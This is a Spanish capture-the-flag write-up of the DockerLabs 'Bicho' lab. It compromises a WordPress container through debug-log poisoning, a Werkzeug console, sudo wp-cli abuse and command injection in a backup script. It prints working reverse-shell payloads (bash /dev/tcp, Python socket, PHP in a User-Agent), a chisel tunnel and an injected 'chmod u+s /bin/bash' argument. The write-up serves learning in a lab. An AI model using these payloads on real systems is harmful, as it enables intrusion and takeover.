---
title: DockerLabs - Bicho
summary: "Write-up del laboratorio Bicho de DockerLabs"
author: elcybercurioso
date: 2025-11-04
categories: [Post, DockerLabs]
tags: [fácil, wordpress, log poisoning, port forwarding, werkzeug, privesc, command injection]
media_subpath: "/assets/img/posts/dockerlabs_bicho"
image:
  path: main.webp
published: true
---

## nmap

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Bicho]
└─$ nmap -p- -sS --min-rate 5000 -v -n -Pn 172.17.0.2 -oG allPorts
PORT   STATE SERVICE
80/tcp open  http
```

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Bicho]
└─$ nmap -sCV -p80 172.17.0.2                              
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-title: Did not follow redirect to http://bicho.dl
|_http-server-header: Apache/2.4.58 (Ubuntu)
```

## análisis

Revisando el puerto 80 del servidor web, nos damos cuenta de que nos redirige a dominio `bicho.dl`, pero debido a que nuestro equipo no sabe interpretar lo que es este dominio, da un error:

![Desktop View](/20251103231611.webp){: width="972" height="589" .shadow}

Para solventar este problema, debemos indicar en el fichero `/etc/hosts` la IP del laboratorio (en mi caso es la 172.17.0.2), y el dominio `bicho.dl` de la siguiente manera:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Bicho]
└─$ cat /etc/hosts                                                                     
...
172.17.0.2      bicho.dl
...
```

Ahora, si volvemos a recargar la página, veremos que nos carga correctamente:

![Desktop View](/20251103231649.webp){: width="972" height="589" .shadow}

Revisando el código fuente de la página descubrimos que se trata de una página creada con WordPress, por lo que lanzamos un análisis con `wpscan` para encontrar más información que nos pueda llegar a servir:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Bicho]
└─$ wpscan --url http://bicho.dl
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | `_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
                               
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] Updating the Database ...
[i] Update completed.

[+] URL: http://bicho.dl/ [172.17.0.2]

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.58 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] Debug Log found: http://bicho.dl/wp-content/debug.log
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | Reference: https://codex.wordpress.org/Debugging_in_WordPress
```

Como estamos tratando con un WordPress, podemos intuir que tiene que tener una pantalla de login, la cual nos puede llegar a revelar usuarios existentes, como en este caso, que nos indica que el usuario `bicho` existe:

![Desktop View](/20251104191942.webp){: width="972" height="589" .shadow}

El reporte de `wpscan` indica que hay un fichero con extensión .log (`http://bicho.dl/wp-content/debug.log`) el cual se encuentra disponible para revisar:

![Desktop View](/20251103235428.webp){: width="972" height="589" .shadow}

Nos damos cuenta de que parte de los datos de las peticiones enviadas al intentar iniciar sesión realizadas se ven reflejados en este fichero, dándonos la posibilidad de explotar un ataque de `Log Poisoning` (ataque que consiste en ejecutar comandos envenenando ficheros log para lograr ejecutar comandos).

## acceso inicial (www-data)

Por ello, procedemos a codificar en base64 la cadena que nos entablará una reverse shell:

```bash
┌──(venv)─(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Bicho/Brute-XMLRPC]
└─$ echo "bash -i >& /dev/tcp/172.17.0.1/4444 0>&1" | base64
YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMTcuMC4xLzQ0NDQgMD4mMQo=
```

Y en una petición de login que hemos capturado con Burp Suite, modificaremos el valor de la cabecera `User-Agent` por código en PHP, el cual, al guardarse en el log, al nosotros acceder al mismo, se interpretará y se ejecutará:

```bash
POST /wp-login.php HTTP/1.1
Host: bicho.dl
User-Agent: <?php echo `printf <cadena base64 anterior> | base64 -d | bash`; ?>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://bicho.dl/wp-login.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 96
Origin: http://bicho.dl
Connection: keep-alive
Cookie: comment_author_510c197c29e72500367368ace716c1e7=test1; comment_author_email_510c197c29e72500367368ace716c1e7=test%40test.com; comment_author_url_510c197c29e72500367368ace716c1e7=http%3A%2F%2Ftest.com; wordpress_test_cookie=WP%20Cookie%20check
Upgrade-Insecure-Requests: 1
Priority: u=0, i

log=bicho&pwd=test&wp-submit=Log+In&redirect_to=http%3A%2F%2Fbicho.dl%2Fwp-admin%2F&testcookie=1
```

De esta manera, si nos hemos puesto anteriormente en escucha, tras enviar la petición modificada, deberíamos haber recibido una conexión con la máquina como el usuario `www-data`:

```bash
┌──(venv)─(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Bicho/Brute-XMLRPC]
└─$ nc -nlvp 4444      
listening on [any] 4444 ...
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 43886
bash: cannot set terminal process group (275): Inappropriate ioctl for device
bash: no job control in this shell
www-data@92ea9e1ae4c3:/var/www/bicho.dl/wp-content$ whoami
whoami
www-data
www-data@92ea9e1ae4c3:/var/www/bicho.dl/wp-content$ hostname -I
hostname -I
172.17.0.2
```

Para poder operar con facilidad, trataremos TTY de la consola:

```bash
www-data@92ea9e1ae4c3:/var/www/bicho.dl/wp-content$ script -c bash /dev/null
script -c bash /dev/null
Script started, output log file is '/dev/null'.
www-data@92ea9e1ae4c3:/var/www/bicho.dl/wp-content$ ^Z
zsh: suspended  nc -nlvp 4444
                                                                                                                                                                        
┌──(venv)─(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Bicho/Brute-XMLRPC]
└─$ stty raw -echo;fg       
[1]  + continued  nc -nlvp 4444
                               reset xterm

www-data@92ea9e1ae4c3:/var/www/bicho.dl/wp-content$ export TERM=xterm
www-data@92ea9e1ae4c3:/var/www/bicho.dl/wp-content$ export SHELL=bash
www-data@92ea9e1ae4c3:/var/www/bicho.dl/wp-content$ stty rows 39 columns 169
```

## movimiento lateral (app)

Los usuarios del laboratorio a los que apuntaremos son los siguientes, los cuales tienen asignados una consola:

```bash
www-data@92ea9e1ae4c3:/var/www/bicho.dl/wp-content$ cat /etc/passwd | grep sh$
root:x:0:0:root:/root:/bin/bash
app:x:1001:1001:,,,:/home/app:/bin/bash
wpuser:x:1002:1002:,,,:/home/wpuser:/bin/bash
```

Revisando como poder llegar a escalar privilegios, nos damos cuenta de que en los procesos que se están ejecutando en el sistema, hay uno que indica que hay desplegada una aplicación, la cual lo más seguro es que se encuentre disponible en el puerto 5000:

```bash
www-data@92ea9e1ae4c3:/home$ netstat -ano
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       Timer
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 127.0.0.1:5000          0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 172.17.0.2:80           172.17.0.1:33188        ESTABLISHED keepalive (6655.40/0/0)
tcp        0      0 172.17.0.2:43886        172.17.0.1:4444         ESTABLISHED off (0.00/0/0)
Active UNIX domain sockets (servers and established)
Proto RefCnt Flags       Type       State         I-Node   Path
unix  2      [ ACC ]     STREAM     LISTENING     18235957 /var/run/mysqld/mysqlx.sock
unix  2      [ ACC ]     STREAM     LISTENING     18237780 /var/run/mysqld/mysqld.sock
www-data@92ea9e1ae4c3:/home$ ps -faux | grep app
www-data     336  0.0  0.0   3528  1764 pts/0    S+   23:12   0:00  |                           \_ grep app
app          287  0.0  0.2  36128 29352 ?        S    23:03   0:00 python3 /app/app.py
app          293  0.1  0.2 109812 29816 ?        Sl   23:03   0:00  \_ /usr/bin/python3 /app/app.py
```

Dado que dicho puerto no es visible desde nuestra máquina de atacante, lo que haremos es traérnoslo con la utilidad  [Chisel](https://github.com/jpillora/chisel), la cual debemos transferirla al laboratorio.

Una vez descargada, la enviaré abriendo un servidor con `python`:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Bicho]
elcybercurioso@kalilinux:~/Desktop/DockerLabs/Bicho$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Y en el laboratorio, lo descargo con `wget` y le doy permisos de ejecución:

```bash
www-data@92ea9e1ae4c3:/tmp$ wget http://172.17.0.1/chisel
--2025-11-03 23:17:50--  http://172.17.0.1/chisel
Connecting to 172.17.0.1:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10240184 (9.8M) [application/octet-stream]
Saving to: 'chisel'

chisel                                     100%[=====================================================================================>]   9.77M  --.-KB/s    in 0.007s  

2025-11-03 23:17:50 (1.45 GB/s) - 'chisel' saved [10240184/10240184]

www-data@92ea9e1ae4c3:/tmp$ ls
chisel
www-data@92ea9e1ae4c3:/tmp$ chmod +x chisel
www-data@92ea9e1ae4c3:/tmp$ ./chisel

  Usage: chisel [command] [--help]

  Version: 1.11.3 (go1.25.1)

  Commands:
    server - runs chisel in server mode
    client - runs chisel in client mode

  Read more:
    https://github.com/jpillora/chisel
```

En nuestra máquina debemos ejecutar `chisel` como servidor en el puerto que queramos, pero debido a que queremos recibir un puerto, indicaremos el parámetro `--reverse`:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Bicho]
└─$ ./chisel server --port 5555 --reverse
2025/11/03 23:20:39 server: Reverse tunnelling enabled
2025/11/03 23:20:39 server: Fingerprint n6DHGPFCDGCxUT5NvlJ/DoPBc+qLW6GoJW/l7s0U1y0=
2025/11/03 23:20:39 server: Listening on http://0.0.0.0:5555
```

En la máquina víctima, ejecutaremos el binario como cliente, conectándonos al puerto indicado en nuestra máquina, indicando que se trata de una conexión reversa (`R:`) a un cierto puerto de la máquina destino(`5000`), y la IP y el puerto de la maquina que queremos redireccionar (`127.0.0.1:5000`):

```bash
www-data@92ea9e1ae4c3:/tmp$ ./chisel client 172.17.0.1:5555 R:5000:127.0.0.1:5000
2025/11/03 23:21:31 client: Connecting to ws://172.17.0.1:5555
2025/11/03 23:21:31 client: Connected (Latency 2.122638ms)
```

De esta manera, si ahora accedemos desde nuestro equipo al puerto interno 5000, veremos que lo que carga el lo del puerto 5000 de la máquina víctima:

![Desktop View](/20251104002204.webp){: width="972" height="589" .shadow}

Hacemos un análisis de dicho puerto para ver ante que nos estamos enfrentando:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Bicho]
└─$ nmap -sCV -p5000 localhost                         
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-03 23:23 GMT
Nmap scan report for localhost (127.0.0.1)
Host is up (0.000067s latency).
Other addresses for localhost (not scanned): ::1

PORT     STATE SERVICE VERSION
5000/tcp open  http    Werkzeug httpd 3.1.3 (Python 3.12.3)
|_http-server-header: Werkzeug/3.1.3 Python/3.12.3
|_http-title: Blog de Writeups

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.15 seconds
```

Y revisamos posibles recursos que puedan haber disponibles:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Bicho]
└─$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://localhost:5000 -t 200   
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://localhost:5000
[+] Method:                  GET
[+] Threads:                 200
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/console              (Status: 200) [Size: 1562]
```

El recurso `/console` en servidores `Werkzeug`, en caso de que se encuentren sin protección o sepamos el código de acceso, nos permiten llegar a ejecutar comandos, por lo que buscamos como ejecutar una reverse shell que nos devuelva una consola:

![Desktop View](/20251104003120.webp){: width="972" height="589" .shadow}

El comando que emplearemos es el siguiente:

```bash
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("172.17.0.1",6666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")
```

![Desktop View](/20251104002943.webp){: width="972" height="589" .shadow}

Nos pondremos en escucha en un puerto disponible, y veremos que al ejecutar el comando, habremos obtenido una consola como el usuario `app`, el cual era el que desplegó el servidor en el puerto 5000 de la máquina víctima:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Bicho]
└─$ nc -nlvp 6666
listening on [any] 6666 ...
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 56206
$ whoami
whoami
app
```

## movimiento lateral (wpuser)

Revisando los permisos SUDO del usuario `app`, vemos que puede ejecutar el binario `/usr/local/bin/wp` como el usuario `wpuser`:

```bash
app@92ea9e1ae4c3:/$ sudo -l
Matching Defaults entries for app on 92ea9e1ae4c3:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User app may run the following commands on 92ea9e1ae4c3:
    (wpuser) NOPASSWD: /usr/local/bin/wp
```

El binario es el que se encarga de desplegar WordPress, y revisando la [documentación](https://make.wordpress.org/cli/handbook/references/config/#global-parameters), nos indican que a la hora de ejecutarlo podemos pasarle el parámetro `--exec` y una instrucción en PHP que ejecutará al iniciar:

![Desktop View](/20251104003441.webp){: width="972" height="589" .shadow}

Sabiendo esto, ejecutamos el siguiente comando, el cual nos devolverá una conexión como el usuario `wpuser`:

```bash
app@92ea9e1ae4c3:/tmp$ sudo -u wpuser /usr/local/bin/wp --exec="system('bash -c \"bash -i >& /dev/tcp/172.17.0.1/4545 0>&1\"');"
```

Si nos hemos puesto en escucha por el puerto indicado en el comando anterior, deberíamos haber obtenido una consola como el usuario `wpuser`:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Bicho]
└─$ nc -nlvp 4545
listening on [any] 4545 ...
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 56058
wpuser@92ea9e1ae4c3:/tmp$ whoami
whoami
wpuser
```

Trataremos la consola para poder navegar con mayor facilidad:

```bash
wpuser@92ea9e1ae4c3:/tmp$ script -c bash /dev/null
script -c bash /dev/null
Script started, output log file is '/dev/null'.
wpuser@92ea9e1ae4c3:/tmp$ ^Z
zsh: suspended  nc -nlvp 4545

┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Bicho]
└─$ stty raw -echo;fg            
[1]  + continued  nc -nlvp 4545
                               reset xterm

wpuser@92ea9e1ae4c3:/tmp$ export TERM=xterm
wpuser@92ea9e1ae4c3:/tmp$ export SHELL=bash
wpuser@92ea9e1ae4c3:/tmp$ stty rows 41 columns 168
```

En el directorio principal del usuario `wpuser` encontramos la primera flag:

```bash
wpuser@92ea9e1ae4c3:~$ ls -la
total 32
drwxr-x--- 3 wpuser wpuser 4096 Apr 15  2025 .
drwxr-xr-x 1 root   root   4096 Apr 15  2025 ..
lrwxrwxrwx 1 root   root      9 Apr 15  2025 .bash_history -> /dev/null
-rw-r--r-- 1 wpuser wpuser  220 Apr 15  2025 .bash_logout
-rw-r--r-- 1 wpuser wpuser 3771 Apr 12  2025 .bashrc
drwxrwxr-x 3 wpuser wpuser 4096 Apr 15  2025 .local
-rw-r--r-- 1 wpuser wpuser  807 Apr 12  2025 .profile
-r--r----- 1 root   wpuser   33 Apr 15  2025 user.txt
wpuser@92ea9e1ae4c3:~$ cat user.txt 
ab15****************************
```

## escalada de privilegios (root)

En los permisos SUDO encontramos que el usuario `wpuser` puede ejecutar un script de Python con los permisos del usuario `root`:

```bash
wpuser@92ea9e1ae4c3:/tmp$ sudo -l
Matching Defaults entries for wpuser on 92ea9e1ae4c3:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User wpuser may run the following commands on 92ea9e1ae4c3:
    (root) NOPASSWD: /opt/scripts/backup.sh
```

Vemos en los permisos del script `/opt/scripts/backup.sh` que no tenemos permisos para editarlo, lo cual evita que podamos ejecutar comandos:

```bash
wpuser@92ea9e1ae4c3:/tmp$ ls -la /opt/scripts/backup.sh
-rwxr-x--- 1 root wpuser 910 Apr 15  2025 /opt/scripts/backup.sh
```

Sin embargo, ya que tenemos permisos para leerlo, podemos analizarlo y buscar otra manera para aprovecharnos:

```bash
wpuser@92ea9e1ae4c3:/tmp$ cat /opt/scripts/backup.sh
#!/bin/bash
# Author: Álvaro Bernal (aka. trr0r)
# backup.sh: Realiza una copia de un log en una ubicación determinada (/backup)

# COLORES
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"
orangeColour="\e[38;5;214m\033[1m"
darkRedColour="\e[38;5;124m\033[1m"

if [ $# -eq 0 ]; then
    echo -e "\n${redColour}[!] Error, debes de proporcionar un argumento.${endColour}\n\n\t${blueColour}Example:${endColour} ${greenColour}/opt/scripts/backup.sh access${endColour}\n"
    exit
fi

# Variables GLOBALES
LOG_DIR="/var/log/apache2"
BACKUP_DIR="/backup"

LOG_NAME=$1

FULL_NAME="$LOG_DIR/$LOG_NAME.log"

/usr/bin/echo "Realizando copia de $FULL_NAME en $BACKUP_DIR"
COMMAND="/usr/bin/cp $FULL_NAME $BACKUP_DIR"
eval $COMMAND
```

Ya que los argumentos que le pasemos al script se ven reflejados directamente en los argumentos del comando que se va a ejecutar posteriormente, podemos llegar a inyectar comandos en la ejecución de la siguiente manera, haciendo que el binario `/bin/bash` tenga permisos SUID:

```bash
wpuser@92ea9e1ae4c3:/tmp$ sudo /opt/scripts/backup.sh "access;chmod u+s /bin/bash;"
Realizando copia de /var/log/apache2/access ; chmod u+s /bin/bash;.log en /backup
/usr/bin/cp: missing destination file operand after '/var/log/apache2/access'
Try '/usr/bin/cp --help' for more information.
/opt/scripts/backup.sh: line 32: .log: command not found
wpuser@92ea9e1ae4c3:/tmp$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1446024 Mar 31  2024 /bin/bash
```

Una vez ejecutado el comando, ya podremos obtener una consola como el usuario `root`:

```bash
wpuser@92ea9e1ae4c3:/tmp$ /bin/bash -p
bash-5.2# whoami
root
```

En el directorio del usuario `root` encontraremos la segunda flag:

```bash
bash-5.2# cd /root
bash-5.2# ls -la
total 28
drwx------ 1 root root 4096 Apr 15  2025 .
drwxr-xr-x 1 root root 4096 Nov  3 23:02 ..
lrwxrwxrwx 1 root root    9 Apr 15  2025 .bash_history -> /dev/null
-rw-r--r-- 1 root root 3127 Apr 12  2025 .bashrc
drwxr-xr-x 3 root root 4096 Apr 11  2025 .cache
drwxr-xr-x 3 root root 4096 Apr 11  2025 .local
lrwxrwxrwx 1 root root    9 Apr 15  2025 .mysql_history -> /dev/null
-rw-r--r-- 1 root root  161 Apr 22  2024 .profile
-r--r----- 1 root root   33 Apr 15  2025 root.txt
bash-5.2# cat root.txt 
58a4****************************
```

Con esto concluiría la resolución del laboratorio!

<a href="https://www.buymeacoffee.com/elcybercurioso" target="_blank"><img src="https://img.buymeacoffee.com/button-api/?text=Buy+me+a+coffee&emoji=&slug=elcybercurioso&button_colour=FFDD00&font_colour=000000&font_family=Cookie&outline_colour=000000&coffee_colour=ffffff" alt="buymecoffee_icon" /></a>

<script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="zweilosec" data-description="Support me on Buy me a coffee!" data-message="Gracias por tu visita! Un café me da las fuerzas para continuar!" data-color="#FFDD00" data-position="Right" data-x_margin="18" data-y_margin="18"></script>